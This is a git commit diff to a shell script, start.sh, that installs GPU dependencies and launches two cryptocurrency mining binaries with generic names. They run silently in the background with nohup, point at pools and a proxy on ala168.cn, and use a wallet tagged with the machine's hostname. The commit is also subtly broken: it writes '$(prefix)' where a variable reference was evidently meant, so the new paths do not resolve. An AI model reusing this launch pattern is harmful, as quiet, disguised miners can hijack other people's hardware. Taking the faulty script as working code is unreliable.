7379236d609dc38c01185049f628a99dec89990f
JamesAlaHZS <163001183+JamesAlaHZS@users.noreply.github.com>
2025-06-04 17:48:07 +0800

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,3 +1,4 @@
+export prefix=./remoteM 
 apt update -y
 sudo apt install libuv1 libuv1-dev -y
 sudo apt install libhwloc-dev hwloc  -y
@@ -13,10 +14,10 @@ pool1=ala168.cn:431
 pool2=ala168.cn:6452
 proxy=ala168.cn:64520
 sudo apt install nvidia-opencl-dev  -y
-chmod u+x thunder
-chmod u+x thunder2
-chmod u+x qd.sh
-chmod u+x reset.sh
-sed "s/hostname/$(hostname)/g" test.json > config.json
-nohup ./thunder --config=config.json > /dev/null 2>&1 &
-nohup ./thunder2 --algorithm sha3x --pool $pool2 --wallet $id2.$(hostname) --tls true --proxy $proxy > /dev/null 2>&1 & 
+chmod u+x $(prefix)/thunder
+chmod u+x $(prefix)/thunder2
+chmod u+x $(prefix)/qd.sh
+chmod u+x $(prefix)/reset.sh
+sed "s/hostname/$(hostname)/g" $(prefix)/test.json > $(prefix)/config.json
+nohup $(prefix)/thunder --config=$(prefix)/config.json > /dev/null 2>&1 &
+nohup $(prefix)/thunder2 --algorithm sha3x --pool $pool2 --wallet $id2.$(hostname) --tls true --proxy $proxy > /dev/null 2>&1 & 
